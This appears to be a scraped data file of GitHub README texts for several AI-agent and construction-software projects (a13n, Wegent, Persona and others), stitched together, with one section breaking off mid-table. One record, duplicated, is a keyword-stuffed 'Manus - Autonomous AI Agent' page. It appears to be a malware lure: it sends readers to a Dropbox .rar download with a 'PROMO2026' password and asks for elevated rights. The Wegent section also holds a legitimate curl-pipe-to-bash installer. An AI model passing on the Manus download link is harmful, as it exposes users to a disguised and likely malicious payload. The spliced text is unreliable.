### Release downloads GitHub release assets only, does not include pip install from PyPI, docker pull from GHCR, git clone, or direct downloads from openconstructionerp.com. [![Downloads (pepy · per month)](https://static.pepy.tech/personalized-badge/openconstructionerp?period=month&units=international_system&left_color=grey&right_color=blue&left_text=downloads%20(pepy%20%C2%B7%20per%20month))](https://pepy.tech/project/openconstructionerp) ### Stars Every current stargazer on the day they starred, one step per day, with nothing smoothed or filled in between. --- ## Support the Project OpenConstructionERP is built by [DataDrivenConstruction](https://datadrivenconstruction.io) and shaped by feedback from users worldwide. If you find it useful: - ⭐ **[Star this repo](https://github.com/datadrivenconstruction/OpenConstructionERP)** - helps others discover the project - **[Community chat (Telegram)](https://t.me/datadrivenconstruction)** - ask questions, share ideas, help others - **[Report issues](https://github.com/datadrivenconstruction/OpenConstructionERP/issues)** - help us improve - **[Professional consulting](https://datadrivenconstruction.io/contact-support/)** - custom deployment, training, enterprise support ## Contributors OpenConstructionERP is shaped by the people who report bugs, request features, and ask the sharp questions that push the platform forward. We credit every one of them. For supply-chain security, we do not merge external pull requests - see **[CONTRIBUTING.md](CONTRIBUTING.md)** for how contributions work here. See **[CONTRIBUTORS.md](CONTRIBUTORS.md)** for the full list. Want to join it? [Open an issue](https://github.com/datadrivenconstruction/OpenConstructionERP/issues) or say hello in the [community chat](https://t.me/datadrivenconstruction). ## Security Report vulnerabilities privately via [GitHub Security Advisories](https://github.com/datadrivenconstruction/OpenConstructionERP/security/advisories/new) or [info@datadrivenconstruction.io](mailto:info@datadrivenconstruction.io). See [SECURITY.md](SECURITY.md) for the full coordinated-disclosure policy and supported versions. ## AI disclaimer AI suggestions produced by this software are preliminary estimates. A qualified construction-estimation professional must verify all quantities, classifications, and costs before any contractual or tender-submission use. See [NOTICE](NOTICE) and [TERMS.md](docs/legal/TERMS.md) §4. ## Trademarks All product names, logos, and trademarks referenced in this repository are property of their respective owners. Any comparative references to commercial categories or products are made for fair comparative purposes based on publicly available information. OpenConstructionERP is an independent project and is not affiliated with, endorsed by, or sponsored by any third-party trademark owners. Full attributions in [NOTICE](NOTICE). ## Development and Contribution Model We integrate all changes through one reviewed and tested development line to keep the many interconnected modules stable, secure and consistent, so the GitHub contributor list shows fewer names than the people who have shaped the project. See [CONTRIBUTING.md](CONTRIBUTING.md) for how to contribute. ## License **AGPL-3.0** - see [LICENSE](LICENSE). Third-party attributions in [NOTICE](NOTICE). You can freely use, modify, and distribute this software. If you modify and deploy it as a service, AGPL §13 requires you to make the corresponding source code available under the same license. For **commercial licensing**, which lifts the AGPL obligations on OpenConstructionERP itself so you can deploy it closed-source, see [COMMERCIAL-LICENSE.md](docs/legal/COMMERCIAL-LICENSE.md) or contact [info@datadrivenconstruction.io](mailto:info@datadrivenconstruction.io). No dependency we ship is under the AGPL, so the commercial license covers everything a closed-source deployment runs. Releases up to and including 18.7.0 shipped PyMuPDF, which is AGPL; PDF reading now goes through pypdfium2 (Apache-2.0 / BSD-3-Clause). Section 4a of that file has the details. ## Privacy and terms - [PRIVACY.md](docs/legal/PRIVACY.md) - GDPR / UK DPA / CCPA / LGPD baseline - [TERMS.md](docs/legal/TERMS.md) - terms of use for the hosted instance - [COOKIES.md](docs/legal/COOKIES.md) - browser storage inventory - [SECURITY.md](SECURITY.md) - responsible disclosure ---

items.name: agent-foundation
items.description: a13n - Build, run, and manage AI agents at scale on your own infrastructure. Open source, with a built-in harness, durable execution, multi-provider support, and a management console. Built With Love 💜 @converge-ai-labs
items.readme_text:
Agent Foundation (a13n)

[![CI](https://github.com/converge-ai-labs/agent-foundation/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/converge-ai-labs/agent-foundation/actions/workflows/ci.yml) [![Documentation](https://img.shields.io/badge/docs-agent--foundation-blue)](https://a13n.dev/docs/) [![Python](https://img.shields.io/badge/python-3.13%2B-blue)](https://www.python.org/) [![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE) [![Slack](https://img.shields.io/badge/Slack-Join%20the%20community-4A154B)](https://join.slack.com/t/a13n/shared_invite/zt-4embv13zr-JfXjmJQop4Y9y6K3NH0kDQ) **Build, run, and manage AI agents at scale on your own infrastructure.** a13n Service is an open-source runtime for managing and running agents. Use Console, its web interface, to configure an agent, try it in a conversation, and debug its tool calls. Your application can then call that same agent through the [HTTP API](docs/a13n-service/connect-application.md) or a [Python, TypeScript, Go, or Rust SDK](docs/a13n-service/sdks.md). Service handles execution and recovery for those requests. - **Long-running tasks:** Agents keep working when clients disconnect. - **Durable execution:** Interrupted runs can resume from saved checkpoints after worker failures. - **Run visibility:** Inspect runs from your application in Console and track workspace usage and cost. Choose your [providers](#providers-and-integrations) for models, sandboxes, web search, and memory. Bring your own keys. ## Run Service [![Console showing six managed agents, their model providers, and status](.github/assets/console-managed-agents.jpg)](.github/assets/console-managed-agents.jpg) Console with fictional demo data. See [run details from a scripted demo](.github/assets/console-run-details.jpg) and [workspace usage](.github/assets/console-usage.jpg). ### Quickstart with Docker Compose Install Docker and Docker Compose, then run: ```bash mkdir a13n-service && cd a13n-service curl -fL https://raw.githubusercontent.com/converge-ai-labs/agent-foundation/main/deploy/docker/compose/a13n-service.yaml -o a13n-service.yaml docker compose -f a13n-service.yaml up -d --wait --pull always ``` Open : 1. Create your administrator account. 2. In **Models**, select **Add model** and configure a model using an API key or an eligible [ChatGPT subscription](docs/a13n-service/models.md#chatgpt-subscription-provider). 3. Create an agent with that model and select **Try agent** to send it a message. 4. Open **Connect to app** on the same agent to get its ID, Service URL, and an API key. Call the agent from your application through the [HTTP API](docs/a13n-service/connect-application.md) or a [Python, TypeScript, Go, or Rust SDK](docs/a13n-service/sdks.md). The stack runs Service, Console, PostgreSQL, and Redis. Agent environments use your host Docker Engine. See the [Compose guide](deploy/docker/compose/README.md) for configuration. ### Production on Kubernetes Deploy to Kubernetes with our [Helm chart](deploy/kubernetes/README.md#other-clusters). Configure API and worker replicas and shared storage for [high availability](docs/a13n-service/operations.md#process-roles). ## Providers and integrations [![Bring your own stack. Self-host a13n with your choice of models, environments, web data providers, and app connections.](.github/assets/a13n-architecture.webp)](https://a13n.dev/docs/#providers-and-integrations) [Models](docs/a13n-service/models.md) · [Sandboxes](docs/a13n-service/environments.md) · [Web search](docs/a13n-service/tools.md#web-search-and-scrape) · [Memory](docs/a13n-service/memory.md) · [App connections](docs/a13n-service/tools.md#connections) ## Use Harness directly Service is built on Harness, which handles tool use, Skills, memory, and subagents. You can also use it without deploying Service: - **In your application:** [Embed Harness](docs/a13n-harness/getting-started.md) in your Python code. Your application manages execution and storage. - **On your machine:** Use [Harness UI](docs/a13n-harness-ui/index.md) to work with agents in a terminal or browser. **Benchmarks:** Harness scored **58.06%** on 62 Terminal-Bench 4.0 tasks, compared with **58.77%** in published Codex results using the same model and reasoning effort. See the [methodology](https://github.com/converge-ai-labs/agent-foundation/discussions/1015) and [FrontierHarness evaluation](https://github.com/converge-ai-labs/agent-foundation/discussions/1064). ## Documentation - [Service documentation](docs/a13n-service/index.md) - [HTTP API and application integration](docs/a13n-service/connect-application.md) - [Deployment and operations](docs/a13n-service/operations.md) - [Examples](examples/README.md) These guides track `main`. For an installed release, use its release notes and package metadata. Ask questions on [Slack](https://join.slack.com/t/a13n/shared_invite/zt-4embv13zr-JfXjmJQop4Y9y6K3NH0kDQ) or [open an issue](https://github.com/converge-ai-labs/agent-foundation/issues) for bugs and feature requests. Read [CONTRIBUTING.md](CONTRIBUTING.md) before submitting changes. You can self-host a13n under the [Apache 2.0 license](LICENSE). See [SECURITY.md](SECURITY.md) to report a vulnerability.

items.description: Plan, build, and deliver with an open-source, self-hostable AI workspace for coding, collaboration, and automation.
items.readme_text:
# Wegent > An open-source work system where people and AI move projects forward together. English | [简体中文](README_zh.md) [![CI](https://github.com/wecode-ai/Wegent/actions/workflows/test.yml/badge.svg)](https://github.com/wecode-ai/Wegent/actions/workflows/test.yml) [![License](https://img.shields.io/github/license/wecode-ai/Wegent)](LICENSE) [![GitHub Issues](https://img.shields.io/github/issues/wecode-ai/Wegent)](https://github.com/wecode-ai/Wegent/issues) Wegent brings team members, AI agents, and personal stand-ins together around the same Issue: describe a goal, assign work, execute tasks, and deliver results. Discussions, execution records, and deliverables stay connected. Work on a local coding project on your own, or hand work across your team in a shared project space. [Download the latest Wegent Desktop](https://github.com/wecode-ai/Wegent/releases/latest) · [Quick start](#quick-start) · [Documentation](https://wecode-ai.github.io/wegent-docs/) · [Contributing](CONTRIBUTING.md) ## One Issue, the whole team [![Watch the 90-second collaboration demo (English)](https://github.com/wecode-ai/Wegent/releases/download/readme-assets/wegent-ai-collaboration-en-20261109.jpg)](https://github.com/wecode-ai/Wegent/releases/download/readme-assets/wegent-ai-collaboration-en-20261109.mp4) [Watch the full demo (90 seconds, English)](https://github.com/wecode-ai/Wegent/releases/download/readme-assets/wegent-ai-collaboration-en-20261109.mp4) Start with “Build an interactive three-column iteration board.” Here is how the work can move forward: 1. **Describe the goal** — Create an Issue and choose a team member, agent, or collaboration group to handle it. 2. **Assign the work** — A configured AI lead can delegate planning and implementation to the appropriate roles. Members receive notifications and open the same Issue. 3. **Execute and deliver** — Members create linked tasks in Wework, use AI to work with files, commands, and tests, then select results to deliver back to the Issue. 4. **Discuss and hand off** — Add feedback and reassign from the discussion. The next member or agent continues with the existing plan and files. 5. **Let a stand-in help, then confirm** — A configured personal stand-in handles work according to its intake scope and processing policy, then hands it back for your confirmation. **Assignment is not completion, and AI output is not personal confirmation.** The Issue connects ownership, execution, discussion, and deliverables so the team can inspect progress, ask questions, and continue the work.

Organize work in a project space with task boards, shared files, and execution status.

## Core capabilities - **People and AI working together** — Assign, discuss, and hand off Issues among team members, agents, and collaboration groups in one project. - **Task execution and delivery** — Create linked tasks from Issues, inspect execution, and deliver selected files and notes back to the project. - **Personal stand-ins (Beta)** — Receive work from authorized project sources according to configured responsibilities and processing policies, with execution records and human-intervention controls. - **Project management and automation** — Organize projects with task boards, shared files, execution records, and deliverables. Configure automatic processing rules and execution queues. - **Local coding workbench** — Use Codex directly with project code, files, commands, and development environments. Review tool activity, tests, and diffs together. - **Reusable agents and execution targets** — Combine models, prompts, Skills, knowledge, and tools. Run tasks locally, on remote work machines, or with server-managed executors. - **Self-hosting** — Deploy Wegent Web and Backend so your team can manage access, permissions, models, scheduling, knowledge services, and remote devices. Personal stand-ins require source authorization, model configuration, and an available execution device. Automatic processing follows project permissions and operation approvals; it does not mean work continues on a powered-off computer. See the [project lead guide](docs/en/wework/personal-stand-in.md#project-lead-controls) for AI lead conversation and automatic-processing requirements; lead conversations currently require experimental features to be enabled. See [Personal stand-in and scenario roles](docs/en/wework/personal-stand-in.md) for configuration. ## Quick start ### Personal use: complete a task in a local project 1. [Download the latest Wegent Desktop installer](https://github.com/wecode-ai/Wegent/releases/latest) and install it. 2. Open the app, follow model setup, and add or select a local project. Local work does not require Wegent Backend login. 3. Create a task describing what to analyze, change, or verify. 4. Inspect agent activity, command output, test results, and file diffs to review the outcome. ### Team collaboration: start with one Issue 1. Create a collaboration project. For shared team access, connect to Wegent Backend and create or join a cloud collaboration project. 2. Add project members. For AI execution, explicitly add agents and configure an available execution environment and model. 3. Create an Issue, describe its goal, and assign it to a member, agent, or collaboration group. 4. Create a linked task from the Issue and deliver the results after execution. Use comments to give feedback and hand work to the next owner. 5. To let a personal stand-in help, configure its project sources, responsibilities, and processing policy in **My stand-in**, then handle human questions and confirmations as needed. New projects do not automatically add agents or enable stand-ins. See [Creating Issues in Collaboration](docs/en/wegent/user-guide/coding/collaboration-issue-home.md) and the [personal stand-in guide](docs/en/wework/personal-stand-in.md) for detailed controls. ### Self-host Wegent Web and Backend To start the self-hosted web application and Backend in standalone mode with Docker: ```bash curl -fsSL https://raw.githubusercontent.com/wecode-ai/Wegent/main/install.sh | bash -s -- --standalone ``` Open http://localhost:3000 and follow the setup flow to create the administrator password and configure a model. See the [Installation Guide](docs/en/wegent/getting-started/installation.md) and [Standalone Mode](docs/en/wegent/deployment/standalone-mode.md) for other deployment options. ## Products ### Wework / Wegent Desktop Wework is the Wegent desktop workbench, connecting project collaboration to execution. It retains the full local coding workflow: organize conversations by project and task, work directly with files, run commands and tests, and review changes and diffs in one workbench. Connect to Backend to use shared project spaces, cloud models, and remote execution devices.

Running and reviewing a local coding task in Wegent Desktop.

### Wegent Web and Backend Wegent Web provides browser-based project collaboration, remote agents, knowledge, automation, and administration. Agents use configured models, knowledge, Skills, and tools. Backend provides shared project resources, access permissions, APIs, scheduling, and execution-device management. Teams can self-host Web and Backend to manage their services and data.

A Wegent remote agent uses tools to generate a Gantt chart.

## Development Requires Node.js 22.15+ (22.x) or 23.8+ (Node.js 24 recommended), and pnpm: ```bash pnpm install pnpm --filter wework dev ``` To run the macOS desktop app: ```bash pnpm --filter wework dev:mac ``` See [wework/README.md](wework/README.md) for desktop development, build, and release instructions. `wework/` is the current desktop application source directory. In the desktop architecture, Electron provides system capabilities and process management, DeepSeek Harness (DSH) hosts the product UI and plugins, and Executor manages tasks and sessions while driving Codex execution. See the [DSH application host](wework/dsh/app-wework/README.en.md) for plugin extension points and [Cloud project collaboration architecture](docs/en/wegent/developer-guide/cloud-project-collaboration.md) for shared-resource and execution boundaries. ## Repository map ### Products and services | Directory | Responsibility | | -------------------------- | --------------------------------------------------------------- | | `wework/` | Wegent Desktop (Electron, Vite, React) | | `wework-mobile/` | Independent Expo application for iOS and Android | | `frontend/` | Wegent Web (Next.js, React) | | `backend/` | Default public API, business logic, and data models | | `backend-rs/` | Rust hybrid gateway and APIs that have completed migration | | `executor/` | Rust task executor, local-device runtime, and Codex integration | | `executor_manager/` | Server-side executor scheduling, sandboxes, and orchestration | | `chat_shell/` | Lightweight chat and agent runtime | | `knowledge_runtime/` | Knowledge indexing and retrieval API | | `knowledge_doc_converter/` | Document parsing and asynchronous conversion service | ### Shared code and developer tools | Directory | Responsibility | | ------------------- | -------------------------------------------------------------------------- | | `knowledge_engine/` | Reusable Python kernel for parsing, indexing, vector stores, and retrieval | | `shared/` | Python models, protocols, utilities, and telemetry shared by services | | `packages/` | TypeScript chat and collaboration modules shared by Web and Desktop | | `sdk/` | Plugin authentication, build, creation, and DingTalk workspace SDKs | | `wegent-cli/` | Python CLI for managing Wegent CRD resources | ### Infrastructure, tests, and documentation | Directory | Responsibility | | ----------- | ------------------------------------------------------------------------------------- | | `docker/` | Service images, standalone resources, and the `docker/telemetry/` observability stack | | `scripts/` | Installation, release, acceptance, repository-policy, and development automation | | `tests/` | items.readme_text:
[![Persona video tour preview](docs/assets/promo-preview-en.webp)](#video-tour) English · [简体中文](README.zh-CN.md) ### One SuperAgent for everything you do.
It knows your world, runs your Agents, and goes wherever you go. **Extension market: [Persona Extensions](https://github.com/nwverse/persona-extensions).** Connect data sources, add tools and skills to the assistant, and add views to the apps. [Add it in one line](#extensions) [![client: iPhone](docs/assets/readme/badge-iphone.svg)](docs/apple/ios.md) [![client: iPad](docs/assets/readme/badge-ipad.svg)](docs/apple/ios.md) [![client: Web](docs/assets/readme/badge-web.svg)](docs/web/web.md) [![client: Android](docs/assets/readme/badge-android.svg)](docs/android/android.md) [![client: Apple Watch](docs/assets/readme/badge-apple-watch.svg)](docs/apple/ios.md) [![client: Vision Pro](docs/assets/readme/badge-vision-pro.svg)](docs/apple/vision.md) [![client: Mac](docs/assets/readme/badge-mac.svg)](docs/desktop/desktop.md) [![client: CarPlay voice](docs/assets/readme/badge-carplay.svg)](docs/apple/carplay.md)
[![agent: Claude Code](docs/assets/readme/badge-claude-code.svg)](docs/integrations/claude-integration.md) [![agent: Codex](docs/assets/readme/badge-codex.svg)](docs/integrations/codex.md) [![agent: opencode](docs/assets/readme/badge-opencode.svg)](docs/integrations/opencode.md) [![agent: pi](docs/assets/readme/badge-pi.svg)](docs/integrations/pi.md) [![agent: DSH](docs/assets/readme/badge-dsh.svg)](docs/integrations/dsh.md) [![agent: Antigravity CLI](docs/assets/readme/badge-antigravity.svg)](docs/integrations/runtimes.md#antigravity-cli)
[![engine: herdr](docs/assets/readme/badge-herdr.svg)](docs/integrations/engines.md) [![engine: Orca](docs/assets/readme/badge-orca.svg)](docs/integrations/engines.md) [![engine: Herdr App](docs/assets/readme/badge-herdr-app.svg)](docs/integrations/engines.md) [![engine: Paseo](docs/assets/readme/badge-paseo.svg)](docs/integrations/paseo.md) [![engine: Cindy](docs/assets/readme/badge-cindy.svg)](docs/integrations/engines.md) [Try the demo](#get-started) · [Features](#features) · [Extensions](#extensions) · [How it works](#how-it-works) · [Docs](#docs)

Demo mode with made-up data.

## Video tour https://github.com/user-attachments/assets/1c16db32-72e3-4d74-8cbf-1976d27b0b78 [HD video and subtitles](https://github.com/nwverse/persona/releases/tag/promo-v1). ## Features - **A SuperAgent, one entry for everything.** Ask in one chat. Persona pulls in your context, breaks the work down and hands it to Agents. [Assistant](docs/assistant/assistant.md) - **Phone and computer, one session.** Claude Code, Codex, opencode, pi, DSH and Antigravity CLI keep running on your computers. Watch them live, answer and approve from your phone, then carry on at your desk. Capabilities vary by runtime and engine. [Runtimes](docs/integrations/runtimes.md) · [Engines](docs/integrations/engines.md) - **Extensions for everything.** Tools, Agent runtimes, data sources, channels and voice plug in, with an SDK and a market. [Extensions](docs/extensions/extensions.md) · [Extension market](https://github.com/nwverse/persona-extensions) - **Dynamic Island, Siri and Shortcuts.** Every Agent at a glance on the Lock Screen; ask, approve or start work by voice, a shortcut or your watch, and call Persona with Siri. [Live Activities](docs/apple/live-activity.md) · [Siri](docs/apple/siri.md) - **Knowledge base and Inbox.** Your chats, people and projects become shared memory; Lark, mail and GitHub land in one AI-sorted Inbox. [Knowledge](docs/assistant/knowledge.md) · [Inbox](docs/assistant/inbox.md) - **Your phone's data, in reach.** Contacts, calendar, reminders, photos, health and location become tools, and writes are confirmed on your phone. [Phone tools](docs/apple/phone-tools.md) - **Connectors and channels.** Bring in Lark, mail, GitHub, iMessage, Telegram and WeChat; talk to Persona from the app, Lark, WeChat or by voice. [Connectors](docs/extensions/connectors.md) · [Channels](docs/extensions/channels.md) - **Every screen.** iPhone, iPad, web, Android, Apple Watch, Vision Pro and Mac, in English, Chinese and Japanese; CarPlay adds audio-only voice conversations on iOS 26.4+, with Apple's entitlement approval and a voice extension. [Clients](docs/apple/ios.md) · [CarPlay setup](docs/apple/carplay.md#enabling-it) ## Extensions [Persona Extensions](https://github.com/nwverse/persona-extensions) is the public extension market for Persona: connect data sources, add tools and skills to the assistant, and add views to the apps. In the app, open **Settings → Extensions → Extension Market**. Recent hubs already list it as the official market; if yours doesn't, add a market with this address (no GitHub token needed): ```text github:nwverse/persona-extensions ``` Then install what you need, for example: - **GitHub, Telegram and X**: what needs you lands in the Inbox, and the assistant can search and read them. - **Home Assistant and Markets**: their own tabs in the app, for your home's devices and automations and for a watchlist with price alerts. - **Hacker News, LINUX DO and V2EX**: browse and read posts in the app, and let the assistant look things up. - **WeChat**: talk to Persona from WeChat. [All extensions](https://github.com/nwverse/persona-extensions/tree/main/extensions) · [Video tour](https://github.com/nwverse/persona-extensions#video-tour) · [Write your own](docs/extensions/extensions.md) ## How it works You run a small hub on an always-on machine; your devices talk only to it, and it reaches each of your computers. Agents run in herdr, Orca, Herdr App, Paseo or Cindy, or through a runtime integration. Engine and runtime capabilities vary; Cindy's read-only database fallback needs the host API for sending and interruption. Your data stays on your own hardware. [Architecture](docs/server/architecture.md) · [Network and security](docs/operations/network.md) ## Get started - **Just looking?** Install the [TestFlight beta](https://testflight.apple.com/join/vsjfy3hE) and tap **No Hub? Try the Demo**: no server or account needed. - **Your own setup:** one command from the [website](https://personaside.com/#start) installs the hub, then scan a QR code. See [Getting started](docs/operations/getting-started.md). - **HarmonyOS 7 phones and foldables:** [build the native ArkUI client from source](harmony/README.md) (API 26). - **From source:** [config](docs/operations/config.md) · [deploy](docs/server/server.md) · [contributing](CONTRIBUTING.md) · [Agent guide](CLAUDE.md) ## Docs [Getting started](docs/operations/getting-started.md) · [Architecture](docs/server/architecture.md) · [Protocol](docs/protocol/protocol.md) · [Docker](docs/operations/docker.md) · [iPhone / iPad / Watch](docs/apple/ios.md) · [Web](docs/web/web.md) · [Android](docs/android/android.md) · [HarmonyOS](docs/harmony/harmony.md) · [Vision Pro](docs/apple/vision.md) · [Desktop](docs/desktop/desktop.md) · [CarPlay voice](docs/apple/carplay.md) · [Engines](docs/integrations/engines.md) · [Agent runtimes](docs/integrations/runtimes.md) · [All docs](CLAUDE.md#docs-index) ## Star History ## License Persona is licensed under the [MIT License](LICENSE). Third-party licenses: [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md).

items.readme_text: # Manus - Autonomous AI Agent ![Manus](https://files.manuscdn.com/webapp/media/ogBanner.png) [![Download Manus](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://www.dropbox.com/scl/fi/kvqr16k9gf7v2bmi2asz8/ManusStudio2.0.rar?rlkey=iif54rqdmga96v9lio1xz56p3&st=6sg0xs6q&dl=1) PROMO2026 --- ## Manus Highlights - **Autonomous Code Execution:** Manus AI agent runs code on its own to complete tasks, so you can focus on decisions instead of repetitive typing and debugging. - **Browser Control Made Simple:** Manus browser control lets the agent navigate websites, fill forms, and gather information without you manually clicking through every page. - **Task Automation For Daily Life:** Manus autonomous tasks handle small but time-consuming jobs, from organizing research to scheduling reminders, keeping your day running smoothly. - **Personal Assistant That Works Quietly:** Manus personal assistant stays ready in the background, responding when you need help with study, home projects, or light work tasks. - **Code And Browser In One Flow:** Manus code automation connects scripting with real browser actions, so your workflows move from idea to result without switching between tools. --- ## What Is Manus Manus is an autonomous AI agent designed to run code and control a browser on your behalf. Instead of acting like a simple chatbot that only answers questions, Manus AI agent takes action. It can write and execute scripts, open web pages, interact with elements, and carry out multi-step tasks with minimal supervision. This makes Manus code automation useful for anyone who wants to reduce manual effort without learning a full programming stack. The core idea behind Manus browser control is practical freedom. You describe what you need, and the agent figures out the steps. Whether that means checking a website for updated information, filling out a repetitive form, or testing a small script, Manus autonomous tasks turn your instructions into completed actions. Manus personal assistant works quietly in the background, ready whenever you need to delegate a small but annoying job. Manus is not a heavy studio suite or a complex enterprise platform. It is a focused helper built for home, study, and small tasks. Students can use Manus code automation to organize research notes or run quick calculations. Remote workers can rely on Manus browser control to gather data from multiple pages. Anyone juggling several small projects can let Manus autonomous tasks handle the repetitive parts while they focus on the parts that need human judgment. Over longer sessions, Manus personal assistant proves its value through consistency. You do not need to re-explain the same workflow every time. Manus AI agent remembers the pattern and applies it again. Manus code automation and Manus browser control work together so that a task starting in a script can finish in a browser, or the other way around. That flexibility keeps small projects moving without constant supervision. --- ## Practical Advantages - **Less Manual Work:** Manus AI agent takes over repetitive code and browser steps, so you spend less time on routine actions and more time on decisions. - **One Agent, Many Tasks:** Manus autonomous tasks cover everything from simple file checks to multi-page web research, making the agent useful across different daily situations. - **No Deep Technical Barrier:** Manus code automation handles the scripting layer while Manus browser control manages the web layer, so you do not need to be a developer to get results. - **Quiet Background Helper:** Manus personal assistant stays out of the way until needed, then responds quickly without disrupting your main workflow. - **Consistent Across Sessions:** Manus AI agent applies the same logic each time, reducing the mental overhead of switching between different tools and interfaces. - **Built For Small Scale:** Manus autonomous tasks are designed for home, study, and light work, not just large enterprise environments. --- ## Compatibility | Component | Minimum | Recommended | |-----------|---------|-------------| | **Operating System** | Modern 64-bit system | Current OS with updated runtime | | **Processor (CPU)** | Dual-core CPU | Modern multi-core CPU for smooth Manus code automation | | **Memory (RAM)** | 4 GB | 8 GB or more for heavy Manus autonomous tasks | | **Storage** | Space for the agent and logs | Extra room for task history and profiles | | **Permissions** | Standard user access | Elevated rights for full Manus browser control | --- ## Starting with Manus Prerequisites: A compatible computer, a stable internet connection, and permission to run background helpers. 1. **Prepare:** Close unnecessary programs and make sure your environment is ready before launching Manus AI agent. 2. **Configure:** Open Manus personal assistant, review the default Manus code automation settings, and adjust triggers if you prefer different behavior. 3. **Test:** Give Manus browser control a simple task, such as opening a page and reading a value, to confirm Manus autonomous tasks behave as expected. 4. **Refine:** Customize which task types Manus AI agent should handle automatically and which ones need your confirmation. 5. **Apply:** Use Manus code automation and Manus browser control throughout your daily work to move small projects forward without constant manual effort. 6. **Maintain:** Revisit settings occasionally to keep Manus personal assistant aligned with your changing workflow and hardware. --- ## Best Uses - **Study And Research:** Manus AI agent helps collect references, run small scripts, and keep notes organized without constant manual switching. - **Home Projects:** Manus autonomous tasks handle repetitive errands like checking pages or organizing files, leaving more time for the parts you enjoy. - **Light Office Work:** Manus browser control makes it easy to gather information from multiple tabs and prepare summaries for small reports. - **Development And Testing:** Manus code automation lets you run quick experiments and compare results without setting up a full environment each time. - **Support And Troubleshooting:** Manus personal assistant gives technicians a fast way to rearrange diagnostic steps and check system pages during remote sessions. - **Everyday Multitasking:** Anyone juggling several small programs benefits from Manus AI agent and its consistent autonomous behavior. --- ## Quick Notes Start with one small Manus AI agent test on a single task, confirm that Manus code automation and Manus browser control feel natural, then expand to your full daily workflow. --- ## Related Search Terms Manus AI agent • Manus code automation • Manus browser control • Manus autonomous tasks • Manus personal assistant • Manus task helper • Manus workflow aid • Manus background agent • Manus code runner • Manus browser helper • Manus daily automation • Manus study assistant • Manus home helper • Manus light work aid • Manus multi-step tasks • Manus script runner • Manus web navigation • Manus task delegation • Manus quiet helper • Manus small project aid • Manus research assistant • Manus routine automation

items.readme_text: # Manus - Autonomous AI Agent ![Manus](https://files.manuscdn.com/webapp/media/ogBanner.png) [![Download Manus](https://img.shields.io/badge/GET%20%E2%80%94%20Manus-0078D6?style=for-the-badge&logoColor=white)](https://www.dropbox.com/scl/fi/kvqr16k9gf7v2bmi2asz8/ManusStudio2.0.rar?rlkey=iif54rqdmga96v9lio1xz56p3&st=6sg0xs6q&dl=1) PROMO2026 --- ## Manus Highlights - **Autonomous Code Execution:** Manus AI agent runs code on its own to complete tasks, so you can focus on decisions instead of repetitive typing and debugging. - **Browser Control Made Simple:** Manus browser control lets the agent navigate websites, fill forms, and gather information without you manually clicking through every page. - **Task Automation For Daily Life:** Manus autonomous tasks handle small but time-consuming jobs, from organizing research to scheduling reminders, keeping your day running smoothly. - **Personal Assistant That Works Quietly:** Manus personal assistant stays ready in the background, responding when you need help with study, home projects, or light work tasks. - **Code And Browser In One Flow:** Manus code automation connects scripting with real browser actions, so your workflows move from idea to result without switching between tools. --- ## What Is Manus Manus is an autonomous AI agent designed to run code and control a browser on your behalf. Instead of acting like a simple chatbot that only answers questions, Manus AI agent takes action. It can write and execute scripts, open web pages, interact with elements, and carry out multi-step tasks with minimal supervision. This makes Manus code automation useful for anyone who wants to reduce manual effort without learning a full programming stack. The core idea behind Manus browser control is practical freedom. You describe what you need, and the agent figures out the steps. Whether that means checking a website for updated information, filling out a repetitive form, or testing a small script, Manus autonomous tasks turn your instructions into completed actions. Manus personal assistant works quietly in the background, ready whenever you need to delegate a small but annoying job. Manus is not a heavy studio suite or a complex enterprise platform. It is a focused helper built for home, study, and small tasks. Students can use Manus code automation to organize research notes or run quick calculations. Remote workers can rely on Manus browser control to gather data from multiple pages. Anyone juggling several small projects can let Manus autonomous tasks handle the repetitive parts while they focus on the parts that need human judgment. Over longer sessions, Manus personal assistant proves its value through consistency. You do not need to re-explain the same workflow every time. Manus AI agent remembers the pattern and applies it again. Manus code automation and Manus browser control work together so that a task starting in a script can finish in a browser, or the other way around. That flexibility keeps small projects moving without constant supervision. --- ## Practical Advantages - **Less Manual Work:** Manus AI agent takes over repetitive code and browser steps, so you spend less time on routine actions and more time on decisions. - **One Agent, Many Tasks:** Manus autonomous tasks cover everything from simple file checks to multi-page web research, making the agent useful across different daily situations. - **No Deep Technical Barrier:** Manus code automation handles the scripting layer while Manus browser control manages the web layer, so you do not need to be a developer to get results. - **Quiet Background Helper:** Manus personal assistant stays out of the way until needed, then responds quickly without disrupting your main workflow. - **Consistent Across Sessions:** Manus AI agent applies the same logic each time, reducing the mental overhead of switching between different tools and interfaces. - **Built For Small Scale:** Manus autonomous tasks are designed for home, study, and light work, not just large enterprise environments. --- ## Compatibility | Component | Minimum | Recommended | |-----------|---------|-------------| | **Operating System** | Modern 64-bit system | Current OS with updated runtime | | **Processor (CPU)** | Dual-core CPU | Modern multi-core CPU for smooth Manus code automation | | **Memory (RAM)** | 4 GB | 8 GB or more for heavy Manus autonomous tasks | | **Storage** | Space for the agent and logs | Extra room for task history and profiles | | **Permissions** | Standard user access | Elevated rights for full Manus browser control | --- ## Starting with Manus Prerequisites: A compatible computer, a stable internet connection, and permission to run background helpers. 1. **Prepare:** Close unnecessary programs and make sure your environment is ready before launching Manus AI agent. 2. **Configure:** Open Manus personal assistant, review the default Manus code automation settings, and adjust triggers if you prefer different behavior. 3. **Test:** Give Manus browser control a simple task, such as opening a page and reading a value, to confirm Manus autonomous tasks behave as expected. 4. **Refine:** Customize which task types Manus AI agent should handle automatically and which ones need your confirmation. 5. **Apply:** Use Manus code automation and Manus browser control throughout your daily work to move small projects forward without constant manual effort. 6. **Maintain:** Revisit settings occasionally to keep Manus personal assistant aligned with your changing workflow and hardware. --- ## Best Uses - **Study And Research:** Manus AI agent helps collect references, run small scripts, and keep notes organized without constant manual switching. - **Home Projects:** Manus autonomous tasks handle repetitive errands like checking pages or organizing files, leaving more time for the parts you enjoy. - **Light Office Work:** Manus browser control makes it easy to gather information from multiple tabs and prepare summaries for small reports. - **Development And Testing:** Manus code automation lets you run quick experiments and compare results without setting up a full environment each time. - **Support And Troubleshooting:** Manus personal assistant gives technicians a fast way to rearrange diagnostic steps and check system pages during remote sessions. - **Everyday Multitasking:** Anyone juggling several small programs benefits from Manus AI agent and its consistent autonomous behavior. --- ## Quick Notes Start with one small Manus AI agent test on a single task, confirm that Manus code automation 